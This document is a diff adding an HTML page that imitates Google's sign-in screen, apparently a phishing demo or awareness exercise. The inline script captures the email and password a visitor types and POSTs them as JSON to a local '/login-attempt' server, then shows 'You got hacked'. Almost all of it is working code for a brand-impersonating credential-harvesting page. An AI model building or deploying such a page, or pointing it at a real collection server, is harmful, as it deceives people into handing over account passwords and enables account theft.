@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: #f5f5f5;
+            font-family: Arial, Helvetica, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .page {
+            width: 100%;
+            max-width: 700px;
+            text-align: center;
+        }
+
+        .login-box {
+            width: 670px;
+            max-width: calc(100% - 40px);
+            min-height: 625px;
+            margin: auto;
+            padding: 45px 30px 35px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 52px;
+            font-weight: 500;
+            letter-spacing: -4px;
+            margin-bottom: 45px;
+        }
+
+        .blue { color: #4285f4; }
+        .red { color: #ea4335; }
+        .yellow { color: #fbbc05; }
+        .green { color: #34a853; }
+
+        h1 {
+            margin: 0;
+            font-size: 36px;
+            font-weight: 600;
+            color: #202124;
+        }
+
+        .subtitle {
+            margin-top: 25px;
+            margin-bottom: 55px;
+            font-size: 20px;
+            color: #5f6368;
+        }
+
+        .email-input,
+        .password-input {
+            width: 100%;
+            height: 62px;
+            padding: 0 18px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 18px;
+            outline: none;
+        }
+
+        .email-input:focus,
+        .password-input:focus {
+            border: 2px solid #4285f4;
+        }
+
+        .account {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            padding: 8px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 20px;
+            color: #3c4043;
+            font-size: 15px;
+            text-align: left;
+        }
+
+        .account-icon {
+            width: 28px;
+            height: 28px;
+            margin-right: 8px;
+            border-radius: 50%;
+            background: #4285f4;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+
+        .forgot {
+            display: block;
+            margin-top: 18px;
+            text-align: left;
+            color: #4285f4;
+            font-size: 17px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .info {
+            margin-top: 38px;
+            text-align: left;
+            color: #5f6368;
+            font-size: 17px;
+            line-height: 1.5;
+        }
+
+        .learn {
+            color: #4285f4;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .button-row {
+            margin-top: 65px;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .next-button {
+            border: none;
+            background: #4285f4;
+            color: white;
+            padding: 14px 30px;
+            border-radius: 4px;
+            font-size: 17px;
+            cursor: pointer;
+        }
+
+        .next-button:hover {
+            background: #3367d6;
+        }
+
+        .languages {
+            margin-top: 35px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        .languages span {
+            margin: 0 12px;
+        }
+
+        #passwordStep {
+            text-align: left;
+        }
+
+        @media (max-width: 600px) {
+            .login-box {
+                min-height: 580px;
+                padding: 35px 22px;
+            }
+
+            .logo {
+                font-size: 44px;
+            }
+
+            h1 {
+                font-size: 30px;
+            }
+
+            .subtitle {
+                font-size: 17px;
+            }
+
+            .email-input,
+            .password-input {
+                height: 55px;
+            }
+
+            .info {
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="page">
+
+    <div class="login-box">
+
+        <div class="logo">
+            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
+        </div>
+
+        <div id="emailStep">
+
+            <h1>Sign in</h1>
+
+            <div class="subtitle">
+                Use your Google Account
+            </div>
+
+            <form id="emailForm">
+
+                <input
+                    type="email"
+                    id="email"
+                    class="email-input"
+                    placeholder="Email or phone"
+                    autocomplete="off"
+                    required
+                >
+
+                <a href="#" class="forgot">
+                    Forgot email?
+                </a>
+
+                <div class="info">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="#" class="learn">Learn more</a>
+                </div>
+
+                <div class="button-row">
+                    <button type="submit" class="next-button">
+                        Next
+                    </button>
+                </div>
+
+            </form>
+
+        </div>
+
+        <div id="passwordStep" style="display:none;">
+
+            <h1>Welcome</h1>
+
+            <div class="subtitle">
+                Sign in to continue
+            </div>
+
+            <div class="account">
+                <div class="account-icon">@</div>
+                <span id="displayEmail"></span>
+            </div>
+
+            <form id="passwordForm">
+
+                <input
+                    type="password"
+                    id="password"
+                    class="password-input"
+                    placeholder="Enter your password"
+                    autocomplete="off"
+                    required
+                >
+
+                <a href="#" class="forgot">
+                    Forgot password?
+                </a>
+
+                <div class="button-row">
+                    <button type="submit" class="next-button">
+                        Next
+                    </button>
+                </div>
+
+            </form>
+
+        </div>
+
+    </div>
+
+    <div class="languages">
+        <span>English (United Kingdom)</span>
+        <span>हिन्दी</span>
+        <span>Español</span>
+    </div>
+
+</div>
+
+<script>
+const API_URL = "http://localhost:3000";
+
+document.getElementById("emailForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    const email = document.getElementById("email").value.trim();
+
+    if (!email) {
+        return;
+    }
+
+    document.getElementById("displayEmail").textContent = email;
+
+    document.getElementById("emailStep").style.display = "none";
+    document.getElementById("passwordStep").style.display = "block";
+});
+
+document.getElementById("passwordForm").addEventListener("submit", async function(event) {
+    event.preventDefault();
+
+    const email = document.getElementById("email").value.trim();
+    const passwordEntered = document.getElementById("password").value;
+
+    try {
+        await fetch("http://localhost:3000/login-attempt", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                email: email,
+                passwordEntered: passwordEntered
+            })
+        });
+    } catch (error) {
+        console.log("Server unavailable");
+    }
+
+    document.getElementById("password").value = "";
+
+    document.querySelector(".login-box").innerHTML = `
+        <h1 style="margin-top:180px;">You got hacked</h1>
+    `;
+});
+
+</script>
+
+</body>
+</html>
